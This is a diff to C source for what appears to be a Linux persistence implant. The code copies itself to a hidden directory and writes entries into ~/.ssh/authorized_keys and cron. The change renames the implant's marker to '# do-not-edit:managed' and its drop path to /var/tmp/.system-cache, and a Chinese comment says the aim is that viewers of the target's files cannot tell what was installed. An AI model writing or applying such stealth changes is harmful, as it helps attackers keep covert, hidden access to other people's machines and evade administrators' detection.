@@ -10,7 +10,18 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#define MARKER "# dayanjing-agent-persist"
+/* 条目标记：用于识别"自己写的那一行"——添加时附加、卸载时按它过滤、
+ * 判是否已装时也靠它。因此它必须同时满足两个相反的要求：
+ *
+ *   1) 足够独特，不能与运维自己写的 authorized_keys 条目撞上，否则卸载
+ *      会删掉别人的 key（判重也会误报"已装"）；
+ *   2) 不得含项目名/产品名——它出现在目标机的 ~/.ssh/authorized_keys 里，
+ *      任何一次 `cat` 都会把"这台机器上装了什么"直接交给查看者。
+ *
+ * 旧值含项目名，已改。代价如实记录：改标记后，用旧版本部署的条目会被
+ * 判成"非本程序写入"，卸载不会删除它们——需要人工清理。本程序此前无
+ * 真实部署，故该代价为零；若将来有存量，改标记前必须先做迁移。 */
+#define MARKER "# do-not-edit:managed"
 
 /* ---------- generate（文本载荷，不写盘） ---------- */
 static size_t gen_cron(const char *arg, char *out, size_t cap) {
@@ -350,11 +361,11 @@ int persist_drop_self(const char *root_prefix, const char *dir,
     if (rd != (size_t)sz) { free(buf); return -1; }
 
     const char *rp = root_prefix ? root_prefix : "";
-    int n = snprintf(out_path, cap, "%s%s/agent", rp, dir ? dir : "/var/tmp/.dayanjing");
+    int n = snprintf(out_path, cap, "%s%s/agent", rp, dir ? dir : "/var/tmp/.system-cache");
     if (n < 0 || (size_t)n >= cap) { free(buf); return -1; }
 
     char dpath[512];
-    snprintf(dpath, sizeof dpath, "%s%s", rp, dir ? dir : "/var/tmp/.dayanjing");
+    snprintf(dpath, sizeof dpath, "%s%s", rp, dir ? dir : "/var/tmp/.system-cache");
     if (mkdir_p(dpath, 0700) != 0) { free(buf); return -1; }
 
     FILE *dst = fopen(out_path, "wb");
@@ -380,7 +391,7 @@ int persist_linux_ensure(const char *root_prefix,
         if (persist_installed(root_prefix, ms[i]) == 1) already++;
 
     /* 落盘自身（覆盖写，幂等）；已驻留时也刷新，保证路径上的副本是最新的 */
-    if (persist_drop_self(root_prefix, "/var/tmp/.dayanjing", out_bin_path, cap) != 0)
+    if (persist_drop_self(root_prefix, "/var/tmp/.system-cache", out_bin_path, cap) != 0)
         return -1;
 
     int newly = 0;
